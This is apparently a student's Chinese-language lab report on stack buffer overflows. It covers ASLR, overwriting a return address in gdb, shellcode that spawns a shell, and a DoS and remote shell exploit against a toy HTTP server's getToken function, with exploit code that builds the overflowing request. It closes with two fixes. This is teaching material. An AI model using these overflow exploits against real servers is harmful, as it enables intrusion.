#缓冲区溢出实验
> 缓冲区在本实验中指的是在栈中的字符数组，c语言数组没有边界检查，因为向数组中填入了超过其大小的数据，导致其溢出覆盖了其他数据，引起安全问题。

现代操作系统都引入了一些列的保护措施，如 **内存地址随机化** 。

 实验1，在`func`中输出`buffer`的地址，因为内存随机化的原因，三次输出的地址都是不相同的，分别是`0x0xbfb47750 0xbfe06650 0xbfbbe4f0`。
 > 内存地址随机化：每次程序执行，其栈地址都不相同，这让我们很难猜测函数的返回地址
 
 在实验3中，因为关闭了ASLR，所以三次输出的地址都相同。在实验四中，用gdb打印出`%eip`的值，这个值不是一个正常的程序地址，因为ret被缓冲区溢出的数据改变了，所以程序崩溃了
。我们可以overwrite这个函数的返回地址，让其指向我们的代码，这样我们就进行了一个缓冲区溢出攻击。

实验5，先是通过gdb手动修改了func函数的返回地址
让其指向badman这个函数，因为badman不是正常调用运行的，所以在其结束时，程序不知指向何方产生了段错误，为了解决这种情况，我们可以
在badman中调用exit函数来结束程序。

实验6，用提供的shellcode来是stack2产生一个shell，程序如下
```c
int func(char *str)//在主函数中把shellcode的地址传给str
{
  char buffer[128];
  /* fill code in here:
   */
   int * ret;//定义一个指向返回地址的指针
   ret=(int *) (buffer+144);//经过gdb，发现ret在buffer+144的地方
   //  *ret =int buffer;//不能在这里直接给*ret赋值，回被str覆盖掉
  strcpy(buffer, str);
 (*ret) = (int) buffer;
  return 1;
}

```
实验7，找出给的服务器的漏洞，经查找，在getToken这个函数中存在一个`while(1)`，如果不满足一定的条件，`s[i]`会一直被赋值，这里会
导致s[1024]这个数组溢出。

> getToken用来取“GET / http1.1\r\n\r\n”，在遇到`' '`或者`\r\n`时会`return`

实验8，攻击服务器，是浏览器一直处于等待服务器信息的状态，利用上一个实验发现的饿漏洞，只要发送http请求时，没有空格和换行符，getToken
就一直处于while循环中，服务器卡住。

实验9，通过栈溢出，是服务器端产生一个shell。

>这里不能让getToken处于死循环，如果这样getToken就不能返回，也就不能执行我们的代码。经过测试，浏览器发送1065个字节的数据给服务器，最后一个自己诶为空格符（使gettoken退出）
,这里发送的字节不能多也不能少，少了没法覆盖返回地址，多了会把fd给淹没掉，socket连接会被关掉。

关键程序代码如下
```c
  char uri[1065];//uri不能太大，否则会把是getToken的参数fd也覆盖掉，这样getchar就读不到fd程序在getchar内终止
	/*先把返回地址写到字符数组*/
  long *addr_s;
  int i;
  addr_s=(long *)uri;
  for(i=0;i<266;i++)
         addr_s[i]=0xbffff9e8;//返回地址为通过gdb服务器得到的
         //在gdb服务器时，调试子进程需要设置如下参数
         //set follow-fork-mode child 
  for(i=0;i<strlen(shellcode);i++)
           uri[i]=shellcode[i];
     uri[1065]='\0';
     uri[1064]=' ';
     //这里的uri是传给socket套接字的
 
```

实验10:修复缓冲区漏洞

1. 可以通过监视s[i]中i的值来防止缓冲区被溢出`if(i>=1024) return;`
2. 可以在s[1023]处，添加个变量，如果检测到该值被修改，退出


